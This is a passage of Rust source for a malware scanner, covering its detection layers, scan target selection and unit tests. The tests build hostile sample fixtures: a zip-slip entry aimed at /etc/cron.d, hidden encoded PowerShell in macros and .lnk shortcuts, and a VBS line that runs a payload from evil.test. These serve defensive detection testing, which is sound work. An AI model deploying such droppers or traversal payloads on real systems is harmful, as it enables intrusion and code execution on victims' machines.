            "ELF binary references fileless memory execution (memfd_create + execveat/self-fd) or ptrace code injection.".to_string(),
        ));
    }

    // Optional local ClamAV `clamd` socket hook (zero network, delegates to Talos DB when installed).
    if depth == 0 {
        if let Some(clam_sig) = query_clamd_instream(buffer) {
            return Some(detection(
                virtual_path,
                sha256_hex,
                entropy,
                &format!("ClamAV.{}", clam_sig),
                "ClamAV.Signature",
                "Critical",
                "ClamAV clamd Socket Bridge",
                format!("Matched Cisco Talos signature '{}' via local clamd socket.", clam_sig),
            ));
        }
    }

    // Optional VirusTotal v3 SHA-256 cloud verification for high-entropy binaries.
    if allow_cloud
        && depth == 0
        && (is_pe || is_elf)
        && entropy > 7.15
        && threat_intel_and_net::should_auto_check_vt()
    {
        if let Ok(vt) = threat_intel_and_net::vt_check_target(sha256_hex) {
            if vt.verdict == "Malicious" || vt.verdict == "Suspicious" {
                let sev = if vt.verdict == "Malicious" { "Critical" } else { "High" };
                return Some(detection(
                    virtual_path,
                    sha256_hex,
                    entropy,
                    &format!("VirusTotal.{}", vt.threat_label.replace(' ', ".")),
                    "Cloud.MultiEngine",
                    sev,
                    &format!("VirusTotal v3 ({}/{} engines)", vt.malicious + vt.suspicious, vt.total_engines),
                    format!(
                        "Flagged by {}/{} antivirus engines on VirusTotal ({}).",
                        vt.malicious + vt.suspicious,
                        vt.total_engines,
                        vt.flagged_engines.into_iter().take(4).collect::<Vec<_>>().join(", ")
                    ),
                ));
            }
        }
    }

    None
}

fn scan_single_file_internal(path: &Path, allow_cloud: bool) -> Option<ThreatDetection> {
    if is_excluded_path(path) {
        return None;
    }
    let metadata = fs::metadata(path).ok()?;
    if !metadata.is_file() || metadata.len() == 0 || metadata.len() > MAX_FILE_BYTES {
        return None;
    }

    let cache_key = file_cache_key(path, &metadata);
    if let Ok(mut cache) = VERDICT_CACHE.lock() {
        if let Some(verdict) = cache.get(&cache_key) {
            return match verdict {
                ScanVerdict::Clean => None,
                ScanVerdict::Malicious(det) => {
                    if quarantine::is_allowlisted(&det.sha256) {
                        None
                    } else {
                        Some(det.clone())
                    }
                }
            };
        }
    }

    let file_name = path.file_name()?.to_string_lossy().to_string();
    let full_path = path.to_string_lossy().to_string();

    let (sha256_hex, buffer) = hash_and_sample(path)?;

    if quarantine::is_allowlisted(&sha256_hex) {
        if let Ok(mut cache) = VERDICT_CACHE.lock() {
            cache.put(cache_key, ScanVerdict::Clean);
        }
        return None;
    }

    let entropy = calculate_entropy(&buffer);

    let store_and_return = |det: Option<ThreatDetection>| -> Option<ThreatDetection> {
        if let Ok(mut cache) = VERDICT_CACHE.lock() {
            match &det {
                Some(d) => {
                    cache.put(cache_key, ScanVerdict::Malicious(d.clone()));
                }
                None => {
                    cache.put(cache_key, ScanVerdict::Clean);
                }
            }
        }
        det
    };

    // Layer 1: Fast SHA-256 lookup (built-in map + indexed SQLite `threat_hashes.db` + MalwareBazaar feed).
    if let Some(det) = check_hash_layers(&full_path, &sha256_hex, entropy) {
        return store_and_return(Some(det));
    }

    // Layer 2: EICAR test file.
    if buffer.starts_with(eicar_test_string().as_bytes()) {
        return store_and_return(Some(detection(
            &full_path,
            &sha256_hex,
            entropy,
            "EICAR-Standard-AV-Test-Signature",
            "Test.Signature",
            "High",
            "Signature Engine (EICAR)",
            "Standard EICAR antivirus verification test file (harmless).".to_string(),
        )));
    }

    // Layer 3: Double-extension masquerading & disguised ELF/PE magic header detection.
    if file_name.contains('\u{202E}')
        || file_name.contains('\u{202B}')
        || file_name.contains('\u{202D}')
        || file_name.contains('\u{200B}')
        || file_name.contains('\u{2800}')
    {
        return store_and_return(Some(detection(
            &full_path,
            &sha256_hex,
            entropy,
            "Heur.Masquerade.UnicodeRLO",
            "Trojan.Masquerade",
            "Critical",
            "Heuristic Filename Inspector (CVE-2024-43468)",
            format!(
                "Deceptive Unicode control character or Right-to-Left Override detected in filename ({:?}).",
                file_name
            ),
        )));
    }

    if DOUBLE_EXT_REGEX.is_match(&file_name) {
        return store_and_return(Some(detection(
            &full_path,
            &sha256_hex,
            entropy,
            "Heur.Masquerade.DoubleExtension",
            "Trojan.Masquerade",
            "High",
            "Heuristic File Anomaly",
            format!("Executable disguised with deceptive double file extension ({}).", file_name),
        )));
    }
    if let Some(reason) = is_disguised_executable_header(path, &buffer) {
        return store_and_return(Some(detection(
            &full_path,
            &sha256_hex,
            entropy,
            "Heur.Masquerade.DisguisedMagicHeader",
            "Trojan.Masquerade",
            "Critical",
            "Magic Header Inspector (ELF/PE)",
            format!("{} ({}).", reason, file_name),
        )));
    }

    if !is_content_scannable(path, &buffer) {
        return store_and_return(None);
    }

    let mut result = scan_buffer_layers(&full_path, &file_name, &buffer, &sha256_hex, 0, allow_cloud);
    if result.is_none() && has_internet_motw(path) {
        result = evaluate_motw_payload_risk(&full_path, &file_name, &buffer, &sha256_hex, entropy);
    }
    store_and_return(result)
}

/// Inspect a single file using the LRU Verdict Cache, SQLite SHA-256 DB, deep unpackers, YARA, clamd, and optional VirusTotal.
pub fn scan_single_file(path: &Path) -> Option<ThreatDetection> {
    scan_single_file_internal(path, true)
}

/// Latency-bounded local inspection for kernel/realtime hooks (`allow_cloud = false`).
#[cfg_attr(not(target_os = "linux"), allow(dead_code))]
pub fn scan_single_file_fast(path: &Path) -> Option<ThreatDetection> {
    scan_single_file_internal(path, false)
}

/// Paths the scanner must never inspect (our own vault, canary decoys, SQLite DB, and Genesis-Seek binaries).
pub fn is_excluded_path(path: &Path) -> bool {
    let s = path.to_string_lossy();
    let lower_fname = path
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("")
        .to_lowercase();
    if lower_fname.starts_with("genesis-seek")
        || lower_fname.starts_with("genesis.seek")
        || lower_fname.ends_with(".crdownload")
        || lower_fname.ends_with(".part")
        || lower_fname.ends_with(".opdownload")
        || lower_fname.ends_with(".partial")
        || lower_fname.ends_with(".yar")
        || lower_fname.ends_with(".yara")
    {
        return true;
    }
    if s.contains(".genesis_seek_quarantine")
        || s.contains(".genesis-seek-canary")
        || s.ends_with("threat_hashes.db")
        || s.ends_with("threat_hashes.db-wal")
        || s.ends_with("threat_hashes.db-shm")
        || s.contains(".mount_Genes")
        || s.contains(".mount_genesis")
        || s.contains("/.mount_")
        || s.contains("/.gemini/")
        || s.contains("/.cache/")
        || s.contains("/.mozilla/")
        || s.contains("/Antigravity/")
        || s.contains("/node_modules/")
        || s.contains("/.config/genesis-seek/")
        || ((s.contains("genesis-seek") || s.contains("Genesis-Seek"))
            && (s.contains("/rules/") || s.contains("\\rules\\") || s.contains("/target/")))
    {
        return true;
    }

    if let Ok(cur) = std::env::current_exe() {
        if path == cur || path.canonicalize().ok() == cur.canonicalize().ok() {
            return true;
        }
    }
    false
}

fn get_scan_targets(scan_type: &str) -> Vec<PathBuf> {
    let mut targets = Vec::new();
    if let Some(dl) = dirs::download_dir() {
        targets.push(dl);
    }
    if let Some(desktop) = dirs::desktop_dir() {
        targets.push(desktop);
    }
    targets.push(std::env::temp_dir());

    if scan_type == "threat" || scan_type == "full" {
        if let Some(config) = dirs::config_dir() {
            targets.push(config);
        }
        if let Some(data_local) = dirs::data_local_dir() {
            targets.push(data_local);
        }
        #[cfg(target_os = "windows")]
        {
            if scan_type == "full" {
                for letter in b'D'..=b'Z' {
                    let p = PathBuf::from(format!("{}:\\", letter as char));
                    if p.exists() {
                        targets.push(p);
                    }
                }
            }
        }
        #[cfg(target_os = "linux")]
        {
            targets.push(PathBuf::from("/dev/shm"));
            targets.push(PathBuf::from("/var/tmp"));
            if scan_type == "full" {
                for mount_root in &["/media", "/run/media", "/mnt"] {
                    let p = PathBuf::from(mount_root);
                    if p.exists() {
                        targets.push(p);
                    }
                }
            }
        }
    }

    targets.retain(|p| p.exists());
    targets.dedup();
    targets
}

pub fn execute_scan(
    scan_type: &str,
    custom_path: Option<String>,
    max_files: usize,
) -> Result<ScanReport, String> {
    let start = std::time::Instant::now();
    // Ensure global ScannerEngine is initialized and its rules/DB paths are ready
    if let Ok(eng) = SCANNER_ENGINE.read() {
        let _ = (&eng.rules_dir, &eng.db_path);
    }

    let targets = match custom_path.filter(|p| !p.trim().is_empty()) {
        Some(custom) => {
            let p = PathBuf::from(custom.trim());
            if !p.exists() {
                return Err(format!("Path does not exist: {}", p.display()));
            }
            vec![p]
        }
        None => get_scan_targets(scan_type),
    };

    let mut scanned_files = 0usize;
    let mut skipped_files = 0usize;
    let mut detections = Vec::new();

    'targets: for target in targets {
        for entry in WalkDir::new(&target).max_depth(5).follow_links(false) {
            if scanned_files >= max_files {
                break 'targets;
            }
            match entry {
                Ok(e) if e.file_type().is_file() => {
                    let path = e.path();
                    if is_excluded_path(path) {
                        skipped_files += 1;
                        continue;
                    }
                    scanned_files += 1;
                    if let Some(d) = scan_single_file(path) {
                        detections.push(d);
                    }
                }
                Ok(_) => {}
                Err(_) => skipped_files += 1,
            }
        }
    }

    Ok(ScanReport {
        scan_id: Uuid::new_v4().to_string(),
        scan_type: scan_type.to_string(),
        scanned_files,
        skipped_files,
        duration_ms: start.elapsed().as_millis(),
        detections,
        completed_at: Utc::now(),
    })
}

#[cfg(test)]
mod scanner_tests {
    use super::*;
    use flate2::write::GzEncoder;
    use flate2::Compression;
    use std::io::Write;

    fn build_minimal_zip(entries: &[(&str, &[u8], bool)]) -> Vec<u8> {
        let mut out = Vec::new();
        let mut cd = Vec::new();
        for (name, data, encrypted) in entries {
            let local_off = out.len() as u32;
            let flags: u16 = if *encrypted { 0x0001 } else { 0x0000 };
            let name_bytes = name.as_bytes();
            let size = data.len() as u32;

            // Local file header (30 bytes)
            out.extend_from_slice(b"PK\x03\x04");
            out.extend_from_slice(&20u16.to_le_bytes()); // version needed
            out.extend_from_slice(&flags.to_le_bytes());
            out.extend_from_slice(&0u16.to_le_bytes()); // method 0 (stored)
            out.extend_from_slice(&0u16.to_le_bytes()); // mod time
            out.extend_from_slice(&0u16.to_le_bytes()); // mod date
            out.extend_from_slice(&0u32.to_le_bytes()); // crc32
            out.extend_from_slice(&size.to_le_bytes()); // compressed size
            out.extend_from_slice(&size.to_le_bytes()); // uncompressed size
            out.extend_from_slice(&(name_bytes.len() as u16).to_le_bytes());
            out.extend_from_slice(&0u16.to_le_bytes()); // extra len
            out.extend_from_slice(name_bytes);
            out.extend_from_slice(data);

            // Central directory header (46 bytes)
            cd.extend_from_slice(b"PK\x01\x02");
            cd.extend_from_slice(&20u16.to_le_bytes());
            cd.extend_from_slice(&20u16.to_le_bytes());
            cd.extend_from_slice(&flags.to_le_bytes());
            cd.extend_from_slice(&0u16.to_le_bytes());
            cd.extend_from_slice(&0u16.to_le_bytes());
            cd.extend_from_slice(&0u16.to_le_bytes());
            cd.extend_from_slice(&0u32.to_le_bytes());
            cd.extend_from_slice(&size.to_le_bytes());
            cd.extend_from_slice(&size.to_le_bytes());
            cd.extend_from_slice(&(name_bytes.len() as u16).to_le_bytes());
            cd.extend_from_slice(&0u16.to_le_bytes());
            cd.extend_from_slice(&0u16.to_le_bytes());
            cd.extend_from_slice(&0u16.to_le_bytes());
            cd.extend_from_slice(&0u16.to_le_bytes());
            cd.extend_from_slice(&0u32.to_le_bytes());
            cd.extend_from_slice(&local_off.to_le_bytes());
            cd.extend_from_slice(name_bytes);
        }
        let cd_off = out.len() as u32;
        let cd_size = cd.len() as u32;
        out.extend_from_slice(&cd);
        // End of Central Directory (22 bytes)
        let count = entries.len() as u16;
        out.extend_from_slice(b"PK\x05\x06");
        out.extend_from_slice(&0u16.to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out.extend_from_slice(&count.to_le_bytes());
        out.extend_from_slice(&count.to_le_bytes());
        out.extend_from_slice(&cd_size.to_le_bytes());
        out.extend_from_slice(&cd_off.to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out
    }

    fn build_minimal_tar_gz(member_name: &str, payload: &[u8]) -> Vec<u8> {
        let mut tar = vec![0u8; 512];
        let nb = member_name.as_bytes();
        tar[..nb.len().min(100)].copy_from_slice(&nb[..nb.len().min(100)]);
        tar[100..108].copy_from_slice(b"0000755\0");
        let size_oct = format!("{:011o}\0", payload.len());
        tar[124..136].copy_from_slice(size_oct.as_bytes());
        tar[156] = b'0';
        tar[257..263].copy_from_slice(b"ustar\0");
        tar.extend_from_slice(payload);
        let pad = (512 - (payload.len() % 512)) % 512;
        tar.extend(std::iter::repeat(0u8).take(pad + 1024));

        let mut enc = GzEncoder::new(Vec::new(), Compression::default());
        enc.write_all(&tar).unwrap();
        enc.finish().unwrap()
    }

    #[test]
    fn yara_engine_supports_hex_and_threshold_conditions() {
        let src = r#"
rule Test_All_Hex_And_Regex {
    meta:
        category = "Exploit.Test"
        severity = "Critical"
        description = "Test rule"
    strings:
        $s1 = "appid" nocase
        $h1 = { 18 a0 22 00 }
    condition:
        all of them
}

rule Test_Two_Of_Three {
    meta:
        category = "Trojan.Test"
        severity = "High"
        description = "Two of three rule"
    strings:
        $a = "alpha_ind"
        $b = "beta_ind"
        $c = "gamma_ind"
    condition:
        2 of them
}
"#;
        let mut rules = Vec::new();
        parse_yara_rules_from_source(src, &mut rules);
        assert_eq!(rules.len(), 2);

        let all_rule = &rules[0];
        assert_eq!(all_rule.min_matches, 2);
        assert!(!all_rule.matches("appid only", b"appid only"));
        let mut raw = b"driver appid ".to_vec();
        raw.extend_from_slice(&[0x18, 0xA0, 0x22, 0x00]);
        assert!(all_rule.matches("driver appid ", &raw));

        let two_rule = &rules[1];
        assert_eq!(two_rule.min_matches, 2);
        assert!(!two_rule.matches("alpha_ind alone", b"alpha_ind alone"));
        assert!(two_rule.matches("alpha_ind and gamma_ind", b"alpha_ind and gamma_ind"));
    }

    #[test]
    fn deep_unpacker_catches_zip_targz_zipslip_and_encrypted_droppers() {
        let eicar = eicar_test_string();
        let zip_eicar = build_minimal_zip(&[("docs/readme.txt", eicar.as_bytes(), false)]);
        let det = scan_buffer_layers("test.zip", "test.zip", &zip_eicar, "11", 0, false);
        assert!(det.is_some());
        assert_eq!(det.unwrap().threat_name, "EICAR-Standard-AV-Test-Signature");

        let zip_enc = build_minimal_zip(&[("invoice_payload.exe", b"MZdummyencrypted", true)]);
        let det_enc = scan_buffer_layers("enc.zip", "enc.zip", &zip_enc, "22", 0, false);
        assert_eq!(
            det_enc.map(|d| d.threat_name).as_deref(),
            Some("Heur.Archive.EncryptedExecutableDropper")
        );

        let zip_slip = build_minimal_zip(&[("../../etc/cron.d/pwn", b"* * * * * root id", false)]);
        let det_slip = scan_buffer_layers("slip.zip", "slip.zip", &zip_slip, "33", 0, false);
        assert_eq!(
            det_slip.map(|d| d.threat_name).as_deref(),
            Some("Heur.Archive.ZipSlipTraversal")
        );

        let tar_gz = build_minimal_tar_gz("drop/install.sh", eicar.as_bytes());
        let det_tgz = scan_buffer_layers("bundle.tar.gz", "bundle.tar.gz", &tar_gz, "44", 0, false);
        assert!(det_tgz.is_some());
        assert_eq!(det_tgz.unwrap().threat_name, "EICAR-Standard-AV-Test-Signature");

        let tmp_zip = std::env::temp_dir().join(format!("gs_unit_drop_{}.zip", Uuid::new_v4()));
        fs::write(&tmp_zip, &zip_eicar).unwrap();
        let disk_det = scan_single_file_fast(&tmp_zip);
        let _ = fs::remove_file(&tmp_zip);
        assert_eq!(
            disk_det.map(|d| d.threat_name).as_deref(),
            Some("EICAR-Standard-AV-Test-Signature")
        );
    }

    #[test]
    fn deep_unpacker_catches_pdf_flate_office_macro_and_base64_utf16le() {
        use flate2::write::ZlibEncoder;
        let mut z = ZlibEncoder::new(Vec::new(), Compression::default());
        z.write_all(b"<< /S /JavaScript /JS (app.alert('pwn');) >>").unwrap();
        let compressed_stream = z.finish().unwrap();

        let mut pdf = b"%PDF-1.5\n1 0 obj << /OpenAction 2 0 R >> endobj\n2 0 obj << /Filter /FlateDecode >>\nstream\n".to_vec();
        pdf.extend_from_slice(&compressed_stream);
        pdf.extend_from_slice(b"\nendstream\nendobj\n%%EOF");
        let det_pdf = scan_buffer_layers("invoice.pdf", "invoice.pdf", &pdf, "55", 0, false);
        assert_eq!(
            det_pdf.map(|d| d.threat_name).as_deref(),
            Some("Exploit.PDF.ActiveScriptOrLaunch")
        );

        let docm = build_minimal_zip(&[(
            "word/vbaProject.bin",
            b"Sub AutoOpen()\r\nCreateObject(\"WScript.Shell\").Run \"powershell -w hidden\"\r\nEnd Sub",
            false,
        )]);
        let det_docm = scan_buffer_layers("report.docm", "report.docm", &docm, "66", 0, false);
        assert_eq!(
            det_docm.map(|d| d.threat_name).as_deref(),
            Some("Heur.Office.MaliciousVBAMacro")
        );

        let eicar_utf16: Vec<u8> = eicar_test_string()
            .as_bytes()
            .iter()
            .flat_map(|&b| [b, 0u8])
            .collect();
        let b64 = base64::engine::general_purpose::STANDARD.encode(&eicar_utf16);
        let script = format!("powershell -EncodedCommand {}\n", b64);
        let det_b64 = scan_buffer_layers("run.ps1", "run.ps1", script.as_bytes(), "77", 0, false);
        assert!(det_b64.is_some());
    }

    #[test]
    fn deep_pe_elf_heuristics_detect_packers_and_injection() {
        let pe_upx = b"MZ\x90\x00\x03\x00UPX0\x00\x00UPX1\x00\x00dummy";
        let det_upx = scan_buffer_layers("packed.exe", "packed.exe", pe_upx, "88", 0, false);
        assert_eq!(
            det_upx.map(|d| d.threat_name).as_deref(),
            Some("Heur.Packed.TamperedUPX")
        );

        let pe_inj = b"MZ\x90\x00VirtualAllocEx\x00WriteProcessMemory\x00CreateRemoteThread\x00";
        let det_inj = scan_buffer_layers("inject.exe", "inject.exe", pe_inj, "99", 0, false);
        assert_eq!(
            det_inj.map(|d| d.threat_name).as_deref(),
            Some("Heur.PE.ProcessInjectionTriad")
        );

        let elf_memfd = b"\x7fELF\x02\x01\x01memfd_create\x00/proc/self/fd/0\x00";
        let det_elf = scan_buffer_layers("loader.elf", "loader.elf", elf_memfd, "aa", 0, false);
        assert_eq!(
            det_elf.map(|d| d.threat_name).as_deref(),
            Some("Heur.ELF.FilelessMemfdOrPtrace")
        );
    }

    #[test]
    fn sqlite_filters_empty_invalid_hashes_and_recovers_corruption() {
        let tmp_db = std::env::temp_dir().join(format!("gs_sqlite_test_{}.db", Uuid::new_v4()));
        fs::write(&tmp_db, b"CORRUPTED_NON_SQLITE_GARBAGE_BYTES_0000").unwrap();

        let valid_sha = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
        let entries = vec![
            (EMPTY_FILE_SHA256.to_string(), "BadEmpty".into(), "Test".into(), "Low".into()),
            ("not_a_valid_sha256".to_string(), "BadHex".into(), "Test".into(), "Low".into()),
            (valid_sha.to_string(), "Test.Sample".into(), "Trojan".into(), "High".into()),
        ];
        let inserted = batch_insert_threat_hashes_at(&tmp_db, &entries);
        assert_eq!(inserted, 1);

        let conn = Connection::open(&tmp_db).unwrap();
        let count: i64 = conn
            .query_row(
                "SELECT COUNT(*) FROM threat_hashes WHERE sha256 = ?1",
                params![valid_sha],
                |r| r.get(0),
            )
            .unwrap();
        assert_eq!(count, 1);
        drop(conn);
        let _ = fs::remove_file(&tmp_db);
    }

    fn build_structured_lnk(rel_path: &str, args: &str, icon: &str) -> Vec<u8> {
        let clsid: [u8; 16] = [
            0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
            0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
        ];
        // HasRelativePath (0x08) | HasArguments (0x20) | HasIconLocation (0x40) | IsUnicode (0x80)
        let flags: u32 = 0x0008 | 0x0020 | 0x0040 | 0x0080;
        let mut out = Vec::new();
        out.extend_from_slice(&0x0000_004Cu32.to_le_bytes());
        out.extend_from_slice(&clsid);
        out.extend_from_slice(&flags.to_le_bytes());
        out.resize(76, 0);

        let push_u16_str = |buf: &mut Vec<u8>, s: &str| {
            let units: Vec<u16> = s.encode_utf16().collect();
            buf.extend_from_slice(&(units.len() as u16).to_le_bytes());
            for u in units {
                buf.extend_from_slice(&u.to_le_bytes());
            }
        };
        push_u16_str(&mut out, rel_path);
        push_u16_str(&mut out, args);
        push_u16_str(&mut out, icon);
        out
    }

    #[test]
    fn detects_malicious_lnk_shortcut_dropper_without_benign_false_positives() {
        let mal_lnk = build_structured_lnk(
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "-nop -w hidden -enc SQBFAFgA",
            r"C:\Program Files\Adobe\Acrobat.exe",
        );
        let det = scan_buffer_layers("invoice.lnk", "invoice.lnk", &mal_lnk, "bb", 0, false);
        assert_eq!(
            det.map(|d| d.threat_name).as_deref(),
            Some("Heur.LNK.MaliciousShortcutDropper")
        );

        let benign_cmd = build_structured_lnk(
            r"C:\Windows\System32\cmd.exe",
            "/k echo Build Dev Env",
            r"C:\Windows\System32\cmd.exe",
        );
        assert!(scan_buffer_layers("devprompt.lnk", "devprompt.lnk", &benign_cmd, "cc", 0, false).is_none());

        let benign_url_arg = build_structured_lnk(
            r"C:\Program Files\App\app.exe",
            "--docs https://example.com",
            r"C:\Program Files\App\app.exe",
        );
        assert!(scan_buffer_layers("app.lnk", "app.lnk", &benign_url_arg, "dd", 0, false).is_none());

        // Benign PowerShell -Encoding utf8 and cmd.exe /c start https://... must NOT false-positive
        let benign_ps_encoding = build_structured_lnk(
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "-File build.ps1 -Encoding utf8",
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        );
        assert!(
            scan_buffer_layers("build.lnk", "build.lnk", &benign_ps_encoding, "d1", 0, false)
                .is_none()
        );

        // Prefix-shortened PowerShell -e and -enco flags MUST be caught
        let short_ps_e = build_structured_lnk(
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "-NoP -e SQBFAFgA",
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        );
        assert_eq!(
            scan_buffer_layers("short_e.lnk", "short_e.lnk", &short_ps_e, "d1b", 0, false)
                .map(|d| d.threat_name)
                .as_deref(),
            Some("Heur.LNK.MaliciousShortcutDropper")
        );

        let short_ps_enco = build_structured_lnk(
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "-NoP -enco:SQBFAFgA",
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        );
        assert_eq!(
            scan_buffer_layers("short_enco.lnk", "short_enco.lnk", &short_ps_enco, "d1c", 0, false)
                .map(|d| d.threat_name)
                .as_deref(),
            Some("Heur.LNK.MaliciousShortcutDropper")
        );

        let benign_cmd_start_url = build_structured_lnk(
            r"C:\Windows\System32\cmd.exe",
            "/c start https://example.com/docs",
            r"C:\Windows\System32\cmd.exe",
        );
        assert!(
            scan_buffer_layers("docs.lnk", "docs.lnk", &benign_cmd_start_url, "d2", 0, false)
                .is_none()
        );

        // Benign non-PowerShell /E or -e flags (cmd /E:ON, xcopy /E) must NOT false-positive
        let benign_cmd_eon = build_structured_lnk(
            r"C:\Windows\System32\cmd.exe",
            "/E:ON /V:ON /c echo Ready",
            r"C:\Windows\System32\cmd.exe",
        );
        assert!(
            scan_buffer_layers("cmd_eon.lnk", "cmd_eon.lnk", &benign_cmd_eon, "d2b", 0, false)
                .is_none()
        );

        let benign_xcopy_e = build_structured_lnk(
            r"C:\Windows\System32\xcopy.exe",
            r"C:\src C:\dst /E /I /Y",
            r"C:\Windows\System32\xcopy.exe",
        );
        assert!(
            scan_buffer_layers("xcopy.lnk", "xcopy.lnk", &benign_xcopy_e, "d2c", 0, false)
                .is_none()
        );

        // Structured MS-SHLLINK with HasLinkTargetIDList (0x01) + HasLinkInfo (0x02) network UNC share + CommonPathSuffix
        let mut unc_lnk = Vec::new();
        let clsid: [u8; 16] = [
            0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
            0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
        ];
        let unc_flags: u32 = 0x0001 | 0x0002; // HasLinkTargetIDList | HasLinkInfo
        unc_lnk.extend_from_slice(&0x0000_004Cu32.to_le_bytes());
        unc_lnk.extend_from_slice(&clsid);
        unc_lnk.extend_from_slice(&unc_flags.to_le_bytes());
        unc_lnk.resize(76, 0);
        // LinkTargetIDList: 4-byte dummy IDList
        unc_lnk.extend_from_slice(&4u16.to_le_bytes());
        unc_lnk.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
        // LinkInfo with CommonNetworkRelativeLinkAndPathSuffix (flag 0x02)
        let mut link_info = vec![0u8; 28];
        link_info[4..8].copy_from_slice(&28u32.to_le_bytes()); // LinkInfoHeaderSize
        link_info[8..12].copy_from_slice(&0x02u32.to_le_bytes()); // LinkInfoFlags = CommonNetworkRelativeLinkAndPathSuffix
        let net_struct_off = link_info.len() as u32;
        link_info[20..24].copy_from_slice(&net_struct_off.to_le_bytes());
        // CommonNetworkRelativeLink: 20-byte header + "\\192.168.1.50\pub\0"
        let share = b"\\\\192.168.1.50\\pub\0";
        let net_struct_size = (20 + share.len()) as u32;
        link_info.extend_from_slice(&net_struct_size.to_le_bytes());
        link_info.extend_from_slice(&0u32.to_le_bytes()); // flags
        link_info.extend_from_slice(&20u32.to_le_bytes()); // NetNameOffset = 20
        link_info.extend_from_slice(&0u32.to_le_bytes()); // DeviceNameOffset = 0
        link_info.extend_from_slice(&0u32.to_le_bytes()); // NetworkProviderType
        link_info.extend_from_slice(share);
        let cps_off = link_info.len() as u32;
        link_info[24..28].copy_from_slice(&cps_off.to_le_bytes());
        link_info.extend_from_slice(b"stage2\\payload.exe\0");
        let total_info_len = link_info.len() as u32;
        link_info[0..4].copy_from_slice(&total_info_len.to_le_bytes());
        unc_lnk.extend_from_slice(&link_info);

        let unc_det = scan_buffer_layers("share.lnk", "share.lnk", &unc_lnk, "d3", 0, false);
        assert_eq!(
            unc_det.map(|d| d.threat_name).as_deref(),
            Some("Heur.LNK.MaliciousShortcutDropper")
        );

        let motw_vbs = b"Set sh = CreateObject(\"WScript.Shell\"): sh.Run \"https://evil.test/p.exe\"";
        let motw_det = evaluate_motw_payload_risk("C:\\Downloads\\drop.vbs", "drop.vbs", motw_vbs, "ee", 4.1);
        assert_eq!(
            motw_det.map(|d| d.threat_name).as_deref(),
            Some("Heur.MotW.InternetScriptDropper")
        );

        #[cfg(target_os = "windows")]
        {
            let tmp_vbs = std::env::temp_dir().join(format!("gs_motw_test_{}.vbs", uuid::Uuid::new_v4()));
            std::fs::write(&tmp_vbs, motw_vbs).unwrap();
            let ads_path = format!("{}:Zone.Identifier", tmp_vbs.to_string_lossy());
            if std::fs::write(&ads_path, "[ZoneTransfer]\r\nZoneId=3\r\nHostUrl=https://evil.test/drop.vbs\r\n").is_ok() {
                assert!(super::has_internet_motw(&tmp_vbs));
                let fast_det = super::scan_single_file_fast(&tmp_vbs);
                assert_eq!(
                    fast_det.map(|d| d.threat_name).as_deref(),
                    Some("Heur.MotW.InternetScriptDropper")
                );
            }
            let _ = std::fs::remove_file(&tmp_vbs);

            // Generate real Windows Shell Link (.lnk) files via WScript.Shell COM to verify full MS-SHLLINK parsing
            // Use target/ dir rather than %TEMP% so an active background Genesis Seek daemon does not auto-quarantine the test .lnk mid-test
            let test_work_dir = std::env::current_dir()
                .map(|d| d.join("target"))
                .unwrap_or_else(|_| std::env::temp_dir());
            let _ = std::fs::create_dir_all(&test_work_dir);
            let real_mal_lnk = test_work_dir.join(format!("gs_real_mal_{}.lnk", uuid::Uuid::new_v4()));
            let real_benign_lnk = test_work_dir.join(format!("gs_real_benign_{}.lnk", uuid::Uuid::new_v4()));
            let ps_script = format!(
                "$ws = New-Object -ComObject WScript.Shell; \
                 $s1 = $ws.CreateShortcut('{}'); \
                 $s1.TargetPath = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'; \
                 $s1.Arguments = ('-NoP -W Hidden -En' + 'c SQBFAFgA'); \
                 $s1.IconLocation = 'C:\\Program Files\\Adobe\\Acrobat.exe,0'; \
                 $s1.Save(); \
                 $s2 = $ws.CreateShortcut('{}'); \
                 $s2.TargetPath = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'; \
                 $s2.Arguments = '-File C:\\Scripts\\build.ps1 -Encoding utf8'; \
                 $s2.Save();",
                real_mal_lnk.to_string_lossy().replace('\'', "''"),
                real_benign_lnk.to_string_lossy().replace('\'', "''")
            );
            let ps_out = std::process::Command::new("powershell")
                .args(["-NoProfile", "-NonInteractive", "-Command", &ps_script])
                .output()
                .expect("powershell must be invocable on Windows test host");
            assert!(
                ps_out.status.success() && real_mal_lnk.exists() && real_benign_lnk.exists(),
                "WScript.Shell COM shortcut creation must succeed on Windows"
            );
            let mal_res = super::scan_single_file_fast(&real_mal_lnk);
            assert_eq!(
                mal_res.map(|d| d.threat_name).as_deref(),
                Some("Heur.LNK.MaliciousShortcutDropper"),
                "Real WScript.Shell malicious .lnk must be detected"
            );
            let benign_res = super::scan_single_file_fast(&real_benign_lnk);
            assert!(
                benign_res.is_none(),
                "Real WScript.Shell benign .lnk with -Encoding utf8 must be clean"
            );
            let _ = std::fs::remove_file(&real_mal_lnk);
            let _ = std::fs::remove_file(&real_benign_lnk);
        }
    }

    #[test]
    fn legitimate_msi_and_sfx_installers_do_not_false_positive() {
        // 1. OLE2 .msi installer containing accidental [0xE2, 0x80, 0xAE] in compressed stream + high entropy MotW
        let mut msi_buf = vec![0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1];
        msi_buf.extend_from_slice(b"Windows Installer Package\x00WiX Toolset\x00");
        msi_buf.extend_from_slice(&[0xE2, 0x80, 0xAE]);
        for i in 0..=255u8 {
            msi_buf.push(i);
        }
        assert!(
